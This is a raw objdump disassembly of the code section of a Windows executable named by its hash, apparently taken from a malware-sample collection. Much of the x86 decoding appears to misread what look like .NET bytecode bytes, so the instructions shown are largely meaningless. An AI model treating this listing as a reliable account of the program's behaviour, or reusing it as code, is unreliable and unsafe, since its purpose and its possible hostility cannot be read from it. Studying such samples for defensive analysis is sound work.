
fecc1365cc1a49cc521cb2d849a71fb10bea2cca3d45cbb7cd81e0b2aacf6620.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	xor    BYTE PTR [ecx+0x0],0x0
  402007:	add    BYTE PTR [eax+0x0],cl
  40200a:	add    BYTE PTR [eax],al
  40200c:	add    al,BYTE PTR [eax]
  40200e:	add    eax,0x5b5400
  402013:	add    BYTE PTR [ebp+edx*2+0x0],ah
  402017:	add    BYTE PTR [ecx],cl
  402019:	add    BYTE PTR [eax],al
  40201b:	add    BYTE PTR [edx],al
  40201d:	add    BYTE PTR [eax],al
  40201f:	push   es
  402020:	or     BYTE PTR [esi],bh
  402022:	add    BYTE PTR [eax],al
  402024:	dec    esp
  402025:	sbb    eax,0x20500000
  40202a:	add    BYTE PTR [eax],al
  40202c:	add    BYTE PTR [eax],0x0
	...
  40204f:	add    BYTE PTR [edx+0x3c],bh
  402052:	and    bl,0xd5
  402055:	fcomp  DWORD PTR [ecx]
  402057:	test   eax,0x5a6c9d72
  40205c:	inc    edi
  40205d:	sbb    eax,0xab038cc7
  402062:	fbstp  TBYTE PTR [eax-0x4604522f]
  402068:	je     0x402049
  40206a:	sub    BYTE PTR [edx-0x46],dl
  40206d:	xchg   ebp,eax
  40206e:	add    ebp,DWORD PTR [ebp-0x5f]
  402071:	js     0x401ffd
  402073:	dec    edi
  402074:	xchg   ecx,eax
  402075:	or     DWORD PTR [edx+0x72],esp
  402078:	jnp    0x4020ef
  40207a:	xchg   ecx,eax
  40207b:	js     0x4020d1
  40207d:	mov    ecx,0xd75e9a51
  402082:	inc    ebx
  402083:	jp     0x402013
  402085:	xchg   eax,eax
  402087:	mov    ch,0x43
  402089:	sti    
  40208a:	add    eax,0x3039ff12
  40208f:	out    dx,eax
  402090:	test   ebx,ebx
  402092:	stc    
  402093:	aam    0x93
  402095:	gs sub al,0x8d
  402098:	pop    ecx
  402099:	inc    esi
  40209a:	pop    eax
  40209b:	test   BYTE PTR [ebp+0x22862b5d],ch
  4020a1:	pop    ds
  4020a2:	xchg   esp,eax
  4020a3:	push   ecx
  4020a4:	or     eax,0x462282c6
  4020a9:	rdmsr  
  4020ab:	dec    esi
  4020ac:	cmp    eax,0x5c4f5e6d
  4020b1:	dec    eax
  4020b2:	je     0x4020fe
  4020b4:	lahf   
  4020b5:	jns    0x402072
  4020b7:	mov    ecx,0x170c70f8
  4020bc:	fist   DWORD PTR [ebp-0x52]
  4020bf:	mov    cl,0x43
  4020c1:	inc    si
  4020c3:	mov    cl,0x12
  4020c5:	das    
  4020c6:	test   eax,ecx
  4020c8:	xchg   ebx,eax
  4020c9:	xchg   ecx,eax
  4020ca:	iret   
  4020cb:	retf   0xdc7a
  4020ce:	dec    edi
  4020cf:	lea    ebx,[edx]
  4020d1:	jb     0x4020d4
  4020d3:	add    BYTE PTR [eax],al
  4020d5:	jo     0x402101
  4020d7:	add    BYTE PTR [ebx],bl
  4020d9:	xor    BYTE PTR ds:0x33800,al
  4020df:	add    BYTE PTR [ecx],al
  4020e1:	add    BYTE PTR [eax],al
  4020e3:	adc    DWORD PTR [ebx+0x41],esi
  4020e6:	add    BYTE PTR [eax],al
  4020e8:	push   es
  4020e9:	or     al,BYTE PTR [esi]
  4020eb:	and    BYTE PTR [ecx],0x0
  4020ee:	add    BYTE PTR [esi+eax*1],al
  4020f1:	add    ch,BYTE PTR [edi+0x3b]
  4020f4:	add    BYTE PTR [eax],al
  4020f6:	push   es
  4020f7:	add    cl,BYTE PTR [esi+0x6122c69]
  4020fd:	outs   dx,DWORD PTR ds:[esi]
  4020fe:	aaa    
  4020ff:	add    BYTE PTR [eax],al
  402101:	push   es
  402102:	outs   dx,DWORD PTR ds:[esi]
  402103:	and    eax,DWORD PTR [eax]
  402105:	add    BYTE PTR [esi],al
  402107:	outs   dx,DWORD PTR ds:[esi]
  402108:	adc    DWORD PTR [eax],eax
  40210a:	add    BYTE PTR [edx],cl
  40210c:	sub    al,0x23
  40210e:	sub    BYTE PTR [edx],dl
  402110:	add    BYTE PTR [eax],al
  402112:	or     ch,BYTE PTR [eax]
  402114:	das    
  402115:	add    BYTE PTR [eax],al
  402117:	push   es
  402118:	outs   dx,DWORD PTR ds:[esi]
  402119:	adc    eax,DWORD PTR [eax]
  40211b:	add    BYTE PTR [edx],cl
  40211d:	sub    BYTE PTR [edx],dl
  40211f:	add    BYTE PTR [eax],al
  402121:	or     ch,BYTE PTR [eax]
  402123:	push   ebp
  402124:	add    BYTE PTR [eax],al
  402126:	push   es
  402127:	outs   dx,DWORD PTR ds:[esi]
  402128:	adc    eax,DWORD PTR [eax]
  40212a:	add    BYTE PTR [edx],cl
  40212c:	cmp    dh,bl
  40212e:	add    DWORD PTR [eax],eax
  402130:	add    BYTE PTR [ebx+0x14],dh
  402133:	add    BYTE PTR [eax],al
  402135:	or     cl,BYTE PTR [ebx]
  402137:	push   es
  402138:	outs   dx,DWORD PTR ds:[esi]
  402139:	aaa    
  40213a:	add    BYTE PTR [eax],al
  40213c:	push   es
  40213d:	outs   dx,DWORD PTR ds:[esi]
  40213e:	and    BYTE PTR [eax],al
  402140:	add    BYTE PTR [esi],al
  402142:	outs   dx,DWORD PTR ds:[esi]
  402143:	adc    DWORD PTR [eax],eax
  402145:	add    BYTE PTR [edx],cl
  402147:	cmp    DWORD PTR [ecx+0x28000000],edx
  40214d:	adc    al,BYTE PTR [eax]
  40214f:	add    BYTE PTR [edx],cl
  402151:	jae    0x402168
  402153:	add    BYTE PTR [eax],al
  402155:	or     al,BYTE PTR [eax+0x4000020]
  40215b:	jle    0x40217d
  40215d:	add    BYTE PTR [eax],al
  40215f:	add    al,0x6f
  402161:	push   ss
  402162:	add    BYTE PTR [eax],al
  402164:	or     bh,BYTE PTR [esi+0x20]
  402167:	add    BYTE PTR [eax],al
  402169:	add    al,0x72
  40216b:	das    
  40216c:	add    BYTE PTR [eax],al
  40216e:	jo     0x4021df
  402170:	pop    ss
  402171:	add    BYTE PTR [eax],al
  402173:	or     bh,BYTE PTR [esi+0x20]
  402176:	add    BYTE PTR [eax],al
  402178:	add    al,0x72
  40217a:	pop    ebx
  40217b:	add    BYTE PTR [eax],al
  40217d:	jo     0x4021ee
  40217f:	pop    ss
  402180:	add    BYTE PTR [eax],al
  402182:	or     bh,BYTE PTR [esi+0x20]
  402185:	add    BYTE PTR [eax],al
  402187:	add    al,0x72
  402189:	imul   eax,DWORD PTR [eax],0xa287000
  40218f:	add    BYTE PTR [eax],al
  402191:	push   es
  402192:	outs   dx,DWORD PTR ds:[esi]
  402193:	sbb    BYTE PTR [eax],al
  402195:	add    BYTE PTR [edx],cl
  402197:	jle    0x4021b9
  402199:	add    BYTE PTR [eax],al
  40219b:	add    al,0x72
  40219d:	jne    0x40219f
  40219f:	add    BYTE PTR [eax+0x28],dh
  4021a2:	or     al,0x0
  4021a4:	add    BYTE PTR [esi],al
  4021a6:	outs   dx,DWORD PTR ds:[esi]
  4021a7:	sbb    BYTE PTR [eax],al
  4021a9:	add    BYTE PTR [edx],cl
  4021ab:	jle    0x4021cd
  4021ad:	add    BYTE PTR [eax],al
  4021af:	add    al,0x72
  4021b1:	test   DWORD PTR [eax],eax
  4021b3:	add    BYTE PTR [eax+0x28],dh
  4021b6:	or     eax,DWORD PTR [eax]
  4021b8:	add    BYTE PTR [esi],al
  4021ba:	outs   dx,DWORD PTR ds:[esi]
  4021bb:	sbb    BYTE PTR [eax],al
  4021bd:	add    BYTE PTR [edx],cl
  4021bf:	jle    0x4021e1
  4021c1:	add    BYTE PTR [eax],al
  4021c3:	add    al,0x6f
  4021c5:	sbb    DWORD PTR [eax],eax
  4021c7:	add    BYTE PTR [edx],cl
  4021c9:	pop    es
  4021ca:	adc    al,0xfe
  4021cc:	push   es
  4021cd:	or     DWORD PTR [eax],eax
  4021cf:	add    BYTE PTR [esi],al
  4021d1:	jae    0x4021ed
  4021d3:	add    BYTE PTR [eax],al
  4021d5:	or     ch,BYTE PTR [edi+0x1b]
  4021d8:	add    BYTE PTR [eax],al
  4021da:	or     ch,BYTE PTR [ebx]
  4021dc:	aas    
  4021dd:	sub    BYTE PTR [edx],dl
  4021df:	add    BYTE PTR [eax],al
  4021e1:	or     dh,BYTE PTR [edx-0x6b]
  4021e4:	add    BYTE PTR [eax],al
  4021e6:	jo     0x402210
  4021e8:	or     al,0x0
  4021ea:	add    BYTE PTR [esi],al
  4021ec:	sub    BYTE PTR [ebx],cl
  4021ee:	add    BYTE PTR [eax],al
  4021f0:	push   es
  4021f1:	outs   dx,DWORD PTR ds:[esi]
  4021f2:	sbb    al,0x0
  4021f4:	add    BYTE PTR [edx],cl
  4021f6:	sub    BYTE PTR [edx],dl
  4021f8:	add    BYTE PTR [eax],al
  4021fa:	or     dh,BYTE PTR [edx-0x5b]
  4021fd:	add    BYTE PTR [eax],al
  4021ff:	jo     0x402229
  402201:	or     al,BYTE PTR [eax]
  402203:	add    BYTE PTR [esi],al
  402205:	outs   dx,DWORD PTR ds:[esi]
  402206:	sbb    eax,0x70a0000
  40220b:	adc    al,0xfe
  40220d:	push   es
  40220e:	or     BYTE PTR [eax],al
  402210:	add    BYTE PTR [esi],al
  402212:	jae    0x40222e
  402214:	add    BYTE PTR [eax],al
  402216:	or     ch,BYTE PTR [edi+0x1b]
  402219:	add    BYTE PTR [eax],al
  40221b:	or     al,BYTE PTR [esi]
  40221d:	outs   dx,DWORD PTR ds:[esi]
  40221e:	cmp    al,BYTE PTR [eax]
  402220:	add    BYTE PTR [esi],al
  402222:	outs   dx,DWORD PTR ds:[esi]
  402223:	push   ds
  402224:	add    BYTE PTR [eax],al
  402226:	or     bh,BYTE PTR [ecx]
  402228:	jecxz  0x40222a
  40222a:	add    BYTE PTR [eax],al
  40222c:	push   es
  40222d:	outs   dx,DWORD PTR ds:[esi]
  40222e:	aaa    
  40222f:	add    BYTE PTR [eax],al
  402231:	push   es
  402232:	outs   dx,DWORD PTR ds:[esi]
  402233:	and    DWORD PTR [eax],eax
  402235:	add    BYTE PTR [esi],al
  402237:	outs   dx,DWORD PTR ds:[esi]
  402238:	pop    ds
  402239:	add    BYTE PTR [eax],al
  40223b:	or     ch,BYTE PTR [edx+ebp*1]
  40223e:	rol    BYTE PTR ds:0x28010000,1
  402244:	and    BYTE PTR [eax],al
  402246:	add    BYTE PTR [edx],cl
  402248:	push   es
  402249:	outs   dx,DWORD PTR ds:[esi]
  40224a:	aaa    
  40224b:	add    BYTE PTR [eax],al
  40224d:	push   es
  40224e:	outs   dx,DWORD PTR ds:[esi]
  40224f:	and    DWORD PTR [eax],eax
  402251:	add    BYTE PTR [esi],al
  402253:	outs   dx,DWORD PTR ds:[esi]
  402254:	and    DWORD PTR [eax],eax
  402256:	add    BYTE PTR [edx],cl
  402258:	pop    ss
  402259:	sub    BYTE PTR [edx],ah
  40225b:	add    BYTE PTR [eax],al
  40225d:	or     ah,BYTE PTR [ebp+0x1000005]
  402263:	and    BYTE PTR [edx],0x0
  402266:	add    BYTE PTR [edi+eax*1],al
  402269:	adc    al,0xfe
  40226b:	push   es
  40226c:	pop    es
  40226d:	add    BYTE PTR [eax],al
  40226f:	push   es
  402270:	jae    0x402295
  402272:	add    BYTE PTR [eax],al
  402274:	or     ch,BYTE PTR [edi+0x24]
  402277:	add    BYTE PTR [eax],al
  402279:	or     dl,BYTE PTR [edi]
  40227b:	push   es
  40227c:	outs   dx,DWORD PTR ds:[esi]
  40227d:	cmp    al,BYTE PTR [eax]
  40227f:	add    BYTE PTR [esi],al
  402281:	outs   dx,DWORD PTR ds:[esi]
  402282:	and    eax,0x330a0000
  402287:	pop    es
  402288:	push   es
  402289:	pop    es
  40228a:	sub    BYTE PTR [eax+eax*1],al
  40228d:	add    BYTE PTR [esi],al
  40228f:	sbb    BYTE PTR [esi],al
  402291:	outs   dx,DWORD PTR ds:[esi]
  402292:	cmp    al,BYTE PTR [eax]
  402294:	add    BYTE PTR [esi],al
  402296:	outs   dx,DWORD PTR ds:[esi]
  402297:	and    eax,0x330a0000
  40229c:	pop    es
  40229d:	push   es
  40229e:	pop    es
  40229f:	sub    BYTE PTR [ebx],al
  4022a1:	add    BYTE PTR [eax],al
  4022a3:	push   es
  4022a4:	push   es
  4022a5:	outs   dx,DWORD PTR ds:[esi]
  4022a6:	aaa    
  4022a7:	add    BYTE PTR [eax],al
  4022a9:	push   es
  4022aa:	outs   dx,DWORD PTR ds:[esi]
  4022ab:	and    BYTE PTR [eax],al
  4022ad:	add    BYTE PTR [esi],al
  4022af:	outs   dx,DWORD PTR ds:[esi]
  4022b0:	adc    DWORD PTR [eax],eax
  4022b2:	add    BYTE PTR [edx],cl
  4022b4:	sub    eax,0x267e59
  4022b9:	add    BYTE PTR [ebp*1+0x122825],al
  4022c0:	add    BYTE PTR [edx],cl
  4022c2:	sub    BYTE PTR [esi+0x0],dl
  4022c5:	add    BYTE PTR [esi],al
  4022c7:	jle    0x4022ec
  4022c9:	add    BYTE PTR [eax],al
  4022cb:	add    al,0x8c
  4022cd:	sub    al,BYTE PTR [eax]
  4022cf:	add    BYTE PTR [ecx],al
  4022d1:	jle    0x4022f7
  4022d3:	add    BYTE PTR [eax],al
  4022d5:	add    al,0x8c
  4022d7:	sub    al,BYTE PTR [eax]
  4022d9:	add    BYTE PTR [ecx],al
  4022db:	outs   dx,DWORD PTR ds:[esi]
  4022dc:	sbb    al,0x0
  4022de:	add    BYTE PTR [edx],cl
  4022e0:	sub    ebp,DWORD PTR ds:0x1228
  4022e6:	or     ch,BYTE PTR [eax]
  4022e8:	push   edi
  4022e9:	add    BYTE PTR [eax],al
  4022eb:	push   es
  4022ec:	jle    0x402311
  4022ee:	add    BYTE PTR [eax],al
  4022f0:	add    al,0x8c
  4022f2:	sub    al,BYTE PTR [eax]
  4022f4:	add    BYTE PTR [ecx],al
  4022f6:	jle    0x40231c
  4022f8:	add    BYTE PTR [eax],al
  4022fa:	add    al,0x8c
  4022fc:	sub    al,BYTE PTR [eax]
  4022fe:	add    BYTE PTR [ecx],al
  402300:	jle    0x402328
  402302:	add    BYTE PTR [eax],al
  402304:	add    al,0x8c
  402306:	sub    al,BYTE PTR [eax]
  402308:	add    BYTE PTR [ecx],al
  40230a:	outs   dx,DWORD PTR ds:[esi]
  40230b:	add    BYTE PTR es:[eax],al
  40230e:	or     bl,ch
  402310:	mov    esp,0xc000000
  402315:	adc    al,0xd
  402317:	or     BYTE PTR [edi+0x27],ch
  40231a:	add    BYTE PTR [eax],al
  40231c:	or     dh,BYTE PTR [edx-0x53]
  40231f:	add    BYTE PTR [eax],al
  402321:	jo     0x402392
  402323:	sub    BYTE PTR [eax],al
  402325:	add    BYTE PTR [edx],cl
  402327:	sub    al,0x18
  402329:	or     BYTE PTR [edi+0x27],ch
  40232c:	add    BYTE PTR [eax],al
  40232e:	or     dh,BYTE PTR [edx-0x53]
  402331:	add    BYTE PTR [eax],al
  402333:	jo     0x4023a4
  402335:	sub    DWORD PTR [eax],eax
  402337:	add    BYTE PTR [edx],cl
  402339:	je     0x402368
  40233b:	add    BYTE PTR [eax],al
  40233d:	add    DWORD PTR ds:0x6f08072b,ecx
  402343:	sub    al,BYTE PTR [eax]
  402345:	add    BYTE PTR [edx],cl
  402347:	or     eax,0x2b6f08
  40234c:	add    BYTE PTR [edx],cl
  40234e:	outs   dx,DWORD PTR ds:[esi]
  40234f:	sub    al,0x0
  402351:	add    BYTE PTR [edx],cl
  402353:	adc    eax,DWORD PTR [edi]
  402355:	sub    esi,DWORD PTR [ecx]
  402357:	adc    DWORD PTR [edi],eax
  402359:	outs   dx,DWORD PTR ds:[esi]
  40235a:	sub    eax,0x740a0000
  40235f:	xor    DWORD PTR [eax],eax
  402361:	add    BYTE PTR [ecx],al
  402363:	adc    eax,DWORD PTR [eax+ebp*1]
  402366:	add    BYTE PTR cs:[eax],al
  402369:	or     ch,BYTE PTR [eax]
  40236b:	pop    ecx
  40236c:	add    BYTE PTR [eax],al
  40236e:	push   es
  40236f:	or     DWORD PTR [ecx],edx
  402371:	add    al,0x6f
  402373:	das    
  402374:	add    BYTE PTR [eax],al
  402376:	or     ch,BYTE PTR [edi+0x1c]
  402379:	add    BYTE PTR [eax],al
  40237b:	or     bh,BYTE PTR [esi+0x23]
  40237e:	add    BYTE PTR [eax],al
  402380:	add    al,0x17
  402382:	pop    eax
  402383:	and    BYTE PTR [ebx],0x0
  402386:	add    BYTE PTR [ecx+edx*1],al
  402389:	pop    es
  40238a:	outs   dx,DWORD PTR ds:[esi]
  40238b:	xor    BYTE PTR [eax],al
  40238d:	add    BYTE PTR [edx],cl
  40238f:	sub    eax,0x1115dec6
  402394:	pop    es
  402395:	jne    0x4023c9
  402397:	add    BYTE PTR [eax],al
  402399:	add    DWORD PTR [ebx],edx
  40239b:	or     BYTE PTR [ecx],dl
  40239d:	or     BYTE PTR [edi+eax*1],ch
  4023a0:	adc    DWORD PTR [eax],ecx
  4023a2:	outs   dx,DWORD PTR ds:[esi]
  4023a3:	xor    DWORD PTR [eax],eax
  4023a5:	add    BYTE PTR [edx],cl
  4023a7:	(bad)  
  4023a9:	adc    eax,DWORD PTR es:0x2e28
  4023b0:	or     ch,BYTE PTR [eax]
  4023b2:	pop    eax
  4023b3:	add    BYTE PTR [eax],al
  4023b5:	push   es
  4023b6:	adc    DWORD PTR ds:0x326f,eax
  4023bc:	or     ch,BYTE PTR [edi+0x1d]
  4023bf:	add    BYTE PTR [eax],al
  4023c1:	or     bh,BYTE PTR [esi+0x23]
  4023c4:	add    BYTE PTR [eax],al
  4023c6:	add    al,0x17
  4023c8:	pop    eax
  4023c9:	and    BYTE PTR [ebx],0x0
  4023cc:	add    BYTE PTR [esi+ebx*8],al
  4023cf:	add    dh,bl
  4023d1:	es jle 0x4023f4
  4023d4:	add    BYTE PTR [eax],al
  4023d6:	add    al,0x2c
  4023d8:	push   ds
  4023d9:	jle    0x4023fb
  4023db:	add    BYTE PTR [eax],al
  4023dd:	add    al,0x6f
  4023df:	sbb    DWORD PTR [eax],eax
  4023e1:	add    BYTE PTR [edx],cl
  4023e3:	jle    0x402405
  4023e5:	add    BYTE PTR [eax],al
  4023e7:	add    al,0x6f
  4023e9:	xor    eax,DWORD PTR [eax]
  4023eb:	add    BYTE PTR [edx],cl
  4023ed:	jle    0x40240f
  4023ef:	add    BYTE PTR [eax],al
  4023f1:	add    al,0x6f
  4023f3:	xor    al,0x0
  4023f5:	add    BYTE PTR [edx],cl
  4023f7:	fdivr  QWORD PTR [esi+0x23]
  4023fa:	add    BYTE PTR [eax],al
  4023fc:	add    al,0x7e
  4023fe:	and    al,0x0
  402400:	add    BYTE PTR [eax+ebx*2],al
  402403:	jle    0x40242b
  402405:	add    BYTE PTR [eax],al
  402407:	add    al,0x59
  402409:	push   ss
  40240a:	xor    BYTE PTR [ebx],al
  40240c:	push   ss
  40240d:	sub    eax,DWORD PTR [ecx]
  40240f:	pop    ss
  402410:	adc    eax,DWORD PTR [esi]
  402412:	adc    DWORD PTR [esi],eax
  402414:	sub    BYTE PTR ds:0x110a0000,dh
  40241a:	push   es
  40241b:	sub    al,BYTE PTR [ecx+0x64]
  40241e:	add    BYTE PTR [eax],al
  402420:	add    al,BYTE PTR [eax]
  402422:	add    BYTE PTR [eax],al
  402424:	jno    0x402428
  402426:	add    BYTE PTR [eax],al
  402428:	add    BYTE PTR ds:[eax],al
  40242b:	add    BYTE PTR [edi+0x15000002],ch
	...
  40243d:	add    BYTE PTR [eax],al
  40243f:	add    BYTE PTR [eax],dh
  402441:	add    al,BYTE PTR [eax]
  402443:	add    BYTE PTR [eax],dh
  402445:	add    al,BYTE PTR [eax]
  402447:	add    BYTE PTR [esi+0x2e000000],dl
  40244d:	add    BYTE PTR [eax],al
  40244f:	add    DWORD PTR [eax],eax
  402451:	add    BYTE PTR [eax],al
  402453:	add    BYTE PTR [eax],al
  402455:	add    BYTE PTR [eax],al
  402457:	add    BYTE PTR [eax],dh
  402459:	add    al,BYTE PTR [eax]
  40245b:	add    dh,al
  40245d:	add    al,BYTE PTR [eax]
  40245f:	add    BYTE PTR [esi],ah
  402461:	add    BYTE PTR [eax],al
  402463:	add    BYTE PTR [ebx],ch
  402465:	add    BYTE PTR [eax],al
  402467:	add    DWORD PTR [edx],eax
  402469:	add    BYTE PTR [eax],al
  40246b:	add    BYTE PTR [eax],al
  40246d:	add    BYTE PTR [eax],al
  40246f:	add    dh,ch
  402471:	add    al,BYTE PTR [eax]
  402473:	add    dh,ch
  402475:	add    al,BYTE PTR [eax]
  402477:	add    BYTE PTR [esi],ah
  402479:	add    BYTE PTR [eax],al
  40247b:	add    BYTE PTR [eax],al
  40247d:	add    BYTE PTR [eax],al
  40247f:	add    BYTE PTR [ebx],bl
  402481:	xor    BYTE PTR [eax+eax*1],al
  402484:	sbb    eax,DWORD PTR [ecx]
  402486:	add    BYTE PTR [eax],al
  402488:	add    al,BYTE PTR [eax]
  40248a:	add    BYTE PTR [ecx],dl
  40248c:	add    esi,DWORD PTR [ebx+0x36]
  40248f:	add    BYTE PTR [eax],al
  402491:	or     cl,BYTE PTR [edx]
  402493:	push   es
  402494:	jle    0x4024b7
  402496:	add    BYTE PTR [eax],al
  402498:	add    al,0x6f
  40249a:	cmp    DWORD PTR [eax],eax
  40249c:	add    BYTE PTR [esi],al
  40249e:	outs   dx,DWORD PTR ds:[esi]
  40249f:	inc    edi
  4024a0:	add    BYTE PTR [eax],al
  4024a2:	push   es
  4024a3:	outs   dx,DWORD PTR ds:[esi]
  4024a4:	aaa    
  4024a5:	add    BYTE PTR [eax],al
  4024a7:	or     al,BYTE PTR [esi]
  4024a9:	jle    0x4024cc
  4024ab:	add    BYTE PTR [eax],al
  4024ad:	add    al,0x6f
  4024af:	cmp    DWORD PTR [eax],eax
  4024b1:	add    BYTE PTR [esi],al
  4024b3:	outs   dx,DWORD PTR ds:[esi]
  4024b4:	inc    ebp
  4024b5:	add    BYTE PTR [eax],al
  4024b7:	push   es
  4024b8:	outs   dx,DWORD PTR ds:[esi]
  4024b9:	adc    DWORD PTR [eax],eax
  4024bb:	add    BYTE PTR [edx],cl
  4024bd:	outs   dx,DWORD PTR ds:[esi]
  4024be:	cmp    BYTE PTR [eax],al
  4024c0:	add    BYTE PTR [edx],cl
  4024c2:	add    ch,BYTE PTR [edi+0x39]
  4024c5:	add    BYTE PTR [eax],al
  4024c7:	push   es
  4024c8:	outs   dx,DWORD PTR ds:[esi]
  4024c9:	dec    eax
  4024ca:	add    BYTE PTR [eax],al
  4024cc:	push   es
  4024cd:	outs   dx,DWORD PTR ds:[esi]
  4024ce:	cmp    DWORD PTR [eax],eax
  4024d0:	add    BYTE PTR [edx],cl
  4024d2:	sub    eax,0x376f022d
  4024d7:	add    BYTE PTR [eax],al
  4024d9:	push   es
  4024da:	outs   dx,DWORD PTR ds:[esi]
  4024db:	and    al,BYTE PTR [eax]
  4024dd:	add    BYTE PTR [esi],al
  4024df:	outs   dx,DWORD PTR ds:[esi]
  4024e0:	adc    eax,0x2c060000
  4024e5:	sbb    eax,DWORD PTR [edx]
  4024e7:	outs   dx,DWORD PTR ds:[esi]
  4024e8:	cmp    DWORD PTR [eax],eax
  4024ea:	add    BYTE PTR [esi],al
  4024ec:	outs   dx,DWORD PTR ds:[esi]
  4024ed:	dec    eax
  4024ee:	add    BYTE PTR [eax],al
  4024f0:	push   es
  4024f1:	add    ch,BYTE PTR [edi+0x37]
  4024f4:	add    BYTE PTR [eax],al
  4024f6:	push   es
  4024f7:	outs   dx,DWORD PTR ds:[esi]
  4024f8:	and    al,BYTE PTR [eax]
  4024fa:	add    BYTE PTR [esi],al
  4024fc:	outs   dx,DWORD PTR ds:[esi]
  4024fd:	cmp    al,BYTE PTR [eax]
  4024ff:	add    BYTE PTR [edx],cl
  402501:	add    ch,BYTE PTR [edi+0x39]
  402504:	add    BYTE PTR [eax],al
  402506:	push   es
  402507:	outs   dx,DWORD PTR ds:[esi]
  402508:	dec    eax
  402509:	add    BYTE PTR [eax],al
  40250b:	push   es
  40250c:	outs   dx,DWORD PTR ds:[esi]
  40250d:	cmp    eax,DWORD PTR [eax]
  40250f:	add    BYTE PTR [edx],cl
  402511:	adc    eax,DWORD PTR [esi]
  402513:	sub    esi,DWORD PTR [eax]
  402515:	adc    al,BYTE PTR [esi]
  402517:	sub    BYTE PTR [eax+eax*1],bh
  40251a:	add    BYTE PTR [edx],cl
  40251c:	or     eax,DWORD PTR [edi]
  40251e:	add    ch,BYTE PTR [edi+0x37]
  402521:	add    BYTE PTR [eax],al
  402523:	push   es
  402524:	outs   dx,DWORD PTR ds:[esi]
  402525:	and    al,BYTE PTR [eax]
  402527:	add    BYTE PTR [esi],al
  402529:	sub    BYTE PTR [eax+eax*1],dh
  40252c:	add    BYTE PTR [esi],al
  40252e:	adc    eax,DWORD PTR [ebx+eax*1]
  402531:	adc    DWORD PTR [edx+edx*1],eax
  402534:	add    dl,BYTE PTR [edx]
  402536:	add    ebp,DWORD PTR [eax]
  402538:	add    eax,0x6060000
  40253d:	or     BYTE PTR [ecx],dl
  40253f:	add    al,0x6f
  402541:	cmp    eax,0x120a0000
  402546:	push   es
  402547:	sub    BYTE PTR [esi],bh
  402549:	add    BYTE PTR [eax],al
  40254b:	or     ch,BYTE PTR ds:0x120edec7
  402551:	push   es
  402552:	(bad)  
  402553:	push   ss
  402554:	push   es
  402555:	add    BYTE PTR [eax],al
  402557:	sbb    ebp,DWORD PTR [edi+0x31]
  40255a:	add    BYTE PTR [eax],al
  40255c:	or     bl,ah
  40255e:	jle    0x40259f
  402560:	add    BYTE PTR [eax],al
  402562:	or     dl,BYTE PTR [ebx]
  402564:	add    eax,0x217e
  402569:	add    al,0x6f
  40256b:	cmp    DWORD PTR [eax],eax
  40256d:	add    BYTE PTR [esi],al
  40256f:	outs   dx,DWORD PTR ds:[esi]
  402570:	dec    ecx
  402571:	add    BYTE PTR [eax],al
  402573:	push   es
  402574:	outs   dx,DWORD PTR ds:[esi]
  402575:	inc    eax
  402576:	add    BYTE PTR [eax],al
  402578:	or     ch,BYTE PTR [esi+edx*1]
  40257b:	jle    0x40259e
  40257d:	add    BYTE PTR [eax],al
  40257f:	add    al,0x6f
  402581:	cmp    DWORD PTR [eax],eax
  402583:	add    BYTE PTR [esi],al
  402585:	outs   dx,DWORD PTR ds:[esi]
  402586:	dec    ecx
  402587:	add    BYTE PTR [eax],al
  402589:	push   es
  40258a:	outs   dx,DWORD PTR ds:[esi]
  40258b:	inc    ecx
  40258c:	add    BYTE PTR [eax],al
  40258e:	or     dl,BYTE PTR [ebx]
  402590:	add    eax,0x426f0303
  402595:	add    BYTE PTR [eax],al
  402597:	or     dl,BYTE PTR [edi]
  402599:	adc    DWORD PTR ds:0x436f,eax
  40259f:	or     al,BYTE PTR [esi]
  4025a1:	outs   dx,DWORD PTR ds:[esi]
  4025a2:	inc    esp
  4025a3:	add    BYTE PTR [eax],al
  4025a5:	or     ch,BYTE PTR [edx]
  4025a7:	add    BYTE PTR [ecx],al
  4025a9:	adc    BYTE PTR [eax],al
  4025ab:	add    BYTE PTR [edx],al
  4025ad:	add    BYTE PTR [edi+0xc43d00],al
  4025b3:	push   cs
  4025b4:	add    BYTE PTR [eax],al
  4025b6:	add    BYTE PTR [eax],al
  4025b8:	adc    esi,DWORD PTR [eax]
  4025ba:	add    al,0x0
  4025bc:	jecxz  0x4025bf
  4025be:	add    BYTE PTR [eax],al
  4025c0:	add    eax,DWORD PTR [eax]
  4025c2:	add    BYTE PTR [ecx],dl
  4025c4:	push   ss
  4025c5:	or     al,BYTE PTR [edx]
  4025c7:	outs   dx,DWORD PTR ds:[esi]
  4025c8:	cmp    BYTE PTR [eax],al
  4025ca:	add    BYTE PTR [esi],al
  4025cc:	outs   dx,DWORD PTR ds:[esi]
  4025cd:	adc    eax,DWORD PTR [eax]
  4025cf:	add    BYTE PTR [esi],al
  4025d1:	outs   dx,DWORD PTR ds:[esi]
  4025d2:	pop    ds
  4025d3:	add    BYTE PTR [eax],al
  4025d5:	or     ch,BYTE PTR [esi+eiz*1]
  4025d8:	sar    BYTE PTR [ebx],1
  4025da:	add    BYTE PTR [eax],al
  4025dc:	add    DWORD PTR [eax],ebp
  4025de:	and    BYTE PTR [eax],al
  4025e0:	add    BYTE PTR [edx],cl
  4025e2:	add    ch,BYTE PTR [edi+0x38]
  4025e5:	add    BYTE PTR [eax],al
  4025e7:	push   es
  4025e8:	outs   dx,DWORD PTR ds:[esi]
  4025e9:	adc    eax,DWORD PTR [eax]
  4025eb:	add    BYTE PTR [esi],al
  4025ed:	outs   dx,DWORD PTR ds:[esi]
  4025ee:	and    DWORD PTR [eax],eax
  4025f0:	add    BYTE PTR [edx],cl
  4025f2:	pop    ss
  4025f3:	sub    BYTE PTR [edx],ah
  4025f5:	add    BYTE PTR [eax],al
  4025f7:	or     ah,BYTE PTR [ebp+0x100003b]
  4025fd:	or     al,BYTE PTR [edx]
  4025ff:	outs   dx,DWORD PTR ds:[esi]
  402600:	cmp    BYTE PTR [eax],al
  402602:	add    BYTE PTR [esi],al
  402604:	outs   dx,DWORD PTR ds:[esi]
  402605:	adc    BYTE PTR [eax],al
  402607:	add    BYTE PTR [esi],al
  402609:	outs   dx,DWORD PTR ds:[esi]
  40260a:	dec    ebx
  40260b:	add    BYTE PTR [eax],al
  40260d:	push   es
  40260e:	outs   dx,DWORD PTR ds:[esi]
  40260f:	pop    ds
  402610:	add    BYTE PTR [eax],al
  402612:	or     ch,BYTE PTR ds:0x5a2810
  402618:	add    BYTE PTR [esi],al
  40261a:	jb     0x4025df
  40261c:	add    BYTE PTR [eax],al
  40261e:	jo     0x402693
  402620:	inc    ebp
